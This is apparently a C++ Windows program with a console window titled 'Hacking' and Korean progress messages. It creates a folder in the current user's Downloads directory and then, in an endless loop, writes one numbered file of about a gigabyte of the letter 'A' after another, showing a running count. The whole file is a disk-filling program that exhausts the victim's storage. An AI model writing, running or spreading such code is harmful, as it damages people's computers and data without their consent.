#pragma warning(disable:4996)
#include <cstdio>
#include <ctime>
#include <stdlib.h>
#include <Windows.h>
#include <conio.h>
#include <iostream>
#include <string.h>
#include <direct.h>
#include <errno.h>
const char console_title[] = "Hacking";
int strlen(char* ptr) {
	int i = 0;
	while (ptr[i] != 0) {
		i++;
	}
	return i;
}
char* stradd(char* a, char* b) {
	char* arr;
	arr = (char*)malloc(strlen(a) + strlen(b) + 1);
	for (int i = 0; i < strlen(a) + strlen(b) + 1; i++) {
		arr[i] = NULL;
	}
	strcat(arr, a);
	strcat(arr, b);
	return arr;
}
void console_size(int x_x, int y_y) {
	//"mode con cols=30 lines=30 | title 제목명"
	char s[200];
	sprintf(s, "mode con cols=%d lines=%d | title %s", x_x, y_y, console_title);
	system(s);
}
int main(void) {
	console_size(30, 5);
	const int size = 300;
	TCHAR UserName[size] = L"";
	DWORD temp_size = size;
	GetUserName(UserName, &temp_size);
	char STR[size];
	WideCharToMultiByte(CP_ACP, 0, UserName, size, STR, size, NULL, NULL);
	char A[size] = "C:\\Users\\", A1[] = "\\Downloads\\output.txt";
	sprintf(A, "C:\\Users\\%s\\Downloads\\",STR);
	char A_1[size];
	sprintf(A_1, "%s\\1", A);
	int result = mkdir(A_1);
	FILE* fp;
	int i_i = 0;
	char Path[size];
	sprintf(Path, "%s\\", A_1);
	char D[size];
	while (1) {
		sprintf(D, "%d.txt", i_i);
		fp = fopen(stradd(Path,D), "w+");
		i_i++;
		for (long long i = 0; i < 1073741823; i++) {
			fprintf(fp, "A");
			if (i % 1048576 == 0) {
				system("cls");
				printf("%d 번째 파일\n%lld Byte",i_i,i);
			}
		}
		fclose(fp);
	}
	return 0;
}